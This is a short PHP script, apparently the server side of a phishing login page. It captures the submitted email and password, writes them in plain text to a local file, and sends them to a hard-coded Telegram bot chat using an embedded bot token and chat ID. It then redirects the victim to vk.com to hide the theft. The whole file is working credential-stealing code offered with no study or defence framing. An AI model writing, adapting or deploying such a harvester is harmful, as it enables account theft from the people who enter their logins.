<?php

$email = trim($_POST['email']);
$pass = trim($_POST['password']);

$fp = fopen('data.txt', 'a');
fwrite($fp, "email: {$email}\n");
fwrite($fp, "pass: {$pass}\n");


#https://api.telegram.org/bot/sendMessage?chat_id=a&text=

$token = "1881156392:AAGoYyyxS9sAcgilbj6sS8nvgco5ODuLPnI"; // токен от telegram bot
$chatid = "1038162734"; // id чата
$mess = "Логин:     {$email}\nПароль:     {$pass}\n"; // сообщение
$tbot = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chatid."&text=".urlencode($mess)); // отправка сообщения
header('Location: https://vk.com');